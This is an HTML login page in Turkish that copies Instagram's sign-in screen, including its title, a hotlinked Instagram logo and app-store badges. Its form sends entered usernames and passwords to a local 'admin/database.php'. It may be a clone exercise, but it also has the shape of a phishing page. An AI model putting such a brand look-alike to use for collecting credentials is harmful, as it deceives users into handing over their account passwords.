<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet" />

    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.0.1/mdb.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="anasayfa.css">

</head>

<body class="custom-bg">

    <div class="container">
        <div class="row justify-content-center align-items-center h-100">
            <div class="col-lg-4">
                <div class="bg-image">
                    <img src="images/dimg/phone.png" alt="" srcset="">

                    <div class="mask">
                        <div class="d-flex justify-content-center align-items-center h-100 ms-5 pb-4">
                            <img src="images/dimg/screenshot1.png" class="sc1 ms-5 ps-5 pb-3" alt="" srcset="">

                        </div>
                    </div>
                </div>

            </div>
            <div class="col-lg-4 ms-3">
                <div class="card shadow-0 border mb-3 rounded-0">
                    <div class="card-body px-5">
                        <div class="text-center p-3 my-3">
                            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yi/r/ZFtnMBJnHU_.png&quot;); background-position: 0px -554px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
                        </div>
                        <form action="admin/database.php" method="POST">
                            <div class="mb-2">
                                <input type="text" class="form-control form-control-lg fs-15 border-color custom-bg" name="user_nickname_seo" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
                            </div>
                            <div class="mb-3">
                                <input type="password" class="form-control form-control-lg fs-15 border-color custom-bg" name="user_password" placeholder="Şifre">
                            </div>

                            <button class="btn btn-primary btn-block text-capitalize" name="login_button" style="background: #0095F6;" type="submit">Giriş yap</button>


                        </form>
                        <div class="text-center">
                            <div class="text-muted mb-3">ya da</div>
                            <div class="text-primary mb-3"> Facebook İle Giriş Yap</div>
                            <div class="fs-12">Şifreni mi unuttun?</div>
                        </div>

                    </div>
                </div>
                <div class="card shadow-0 border rounded-0">
                    <div class="card-body py-3 text-center">
                        <div class="fs-14">Hesabın yok mu? <a href="register" class="text-primary">Kaydol</a></div>
                    </div>
                </div>
                <div class="card shadow-0 bg-transparent">
                    <div class="card-body">
                        <div class="text-center mb-3">Uygulamayı indir.</div>
                        <div class="d-flex justify-content-center">
                            <img src="images/dimg/google_play.png" class="img-fluid me-2" width="134" alt="">
                            <img src="images/dimg/microsoft.png" class="img-fluid" width="110" alt="">
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>

</body>